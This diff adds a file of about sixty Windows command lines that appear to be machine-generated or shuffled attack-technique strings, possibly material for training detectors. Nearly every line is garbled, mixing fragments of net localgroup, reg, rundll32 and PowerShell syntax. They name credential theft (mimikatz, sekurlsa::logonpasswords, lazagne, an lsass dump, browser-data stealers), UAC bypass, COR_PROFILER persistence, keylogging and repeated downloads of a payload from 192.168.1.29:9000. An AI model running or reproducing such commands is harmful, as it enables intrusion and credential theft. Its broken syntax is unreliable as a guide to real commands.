@@ -1,0 +1,64 @@
+copy $ { shadow write-host `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+nmap -o $ { cor_enable_profiling -name $ : cor_profiler_path /grant administrators '' -l '' \windows\system32\sethc.exe
+nbtstat -n
+for /l % \microsoft\teams\current\teams.exe
+net start = monitorprocess
+nmap -o $ administrators ''
+nbtstat -n
+gpresult /z
+$ shortcut.workingdirectory = `` appinit_dlls ''
+nbtstat -n
+rundll32 popcalc.dll , keylog
+nbtstat -n
+net localgroup `` cor_profiler administrators '' /grant 1
+net localgroup `` cor_profiler '' /grant administrators '' /f
+net localgroup administrators `` cor_profiler '' /t reg_dword
+net group `` cor_profiler '' /t reg_dword /d $ true
+net localgroup `` administrators '' `` cor_profiler '' /f
+sekurlsa : windir % localappdata % \microsoft\teams\current\teams.exe
+`` hklm : hklm\system\currentcontrolset\control\lsa\ -r binpath= `` keylog
+reg delete = `` `` http : :logonpasswords -t '' -- $ ( $ i ; -t $ filterargs
+gobuster dns -d -w $ volumn -o : } -t $ { file_name } in $ { registry_path }
+rundll32.exe \\ $ ( ; -- domain_name name = [ net.securityprotocoltype ] : [ net.securityprotocoltype where ] : :securityprotocol \\ http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+get-eventlog -list | | localappdata \microsoft\teams\current\teams.exe
+copy-item `` $ filterargs
+rdrleakdiag.exe /p volumn command= -o user_name } /add
+iediagcmd.exe /out
+iediagcmd.exe /out $ profile
+attrib +h $ domain
+net localgroup administrators `` cor_profiler '' ''
+iediagcmd.exe /out /t $ /f
+ffuf -w $ '' '' ;
+videocap.exe -t $ consumerargs
+net accounts
+net localgroup `` administrators '' /t reg_expand_sz /v cor_profiler '' -name 1 ''
+bypassuac.exe $ : username
+get-ciminstance -classname win32_processor | select-object -expandproperty username
+ffuf -w $ i -w 5
+-accepteula /r -sn $ shadow volumn name you create = execution file components\atomic_test '' /grant file c http execution \system32\windowspowershell\v1.0\powershell.exe \windows\temp\lsass_dump.dmp
+net localgroup `` t1547.009 nt\currentversion\image file file c lazagne.exe
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` administrators '' '' /v cor_profiler '' ''
+net localgroup `` administrators '' '' c : __eventfilter '' /v administrators '' ''
+bypassuac.exe $ `` hklm\software\microsoft\windows powershell /d `` cor_profiler '' ''
+add-localgroupmember nt\currentversion\winlogon\notify\atomicredteam '' /t cor_profiler = threadingmodel ''
+$ shortcut = `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+rdrleakdiag.exe /p domain administrator
+net localgroup /grant administrators '' -name `` cor_profiler '' ''
+rundll32.exe `` http http execution dir .downloadstring http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+hack-browser-data-windows-64bit.exe
+quser
+get-wmiobject /start /output
+net localgroup administrators '' /f /grant administrators '' , keylog
+net localgroup administrators `` .\lazagne -class # : cor_profiler administrators '' $ `` cor_enable_profiling = threadingmodel ''
+namp -sn -u $ target ;
+invoke-mimikatz.exe
+lazagne.exe windows
+attrib , code hklm : -scope -verbose
+tree
+[ firewall set opmode
+quser
+set windir= $ : -c `` cor_profiler '' reg_dword ''
+namp -sn -l $ target t1547.009 ; -mscache
+net localgroup `` administrators '' /v cor_profiler '' c : file '' , threadingmodel '' -name $ enabled ;
+powershell -executionpolicy bypass /grant administrators ''
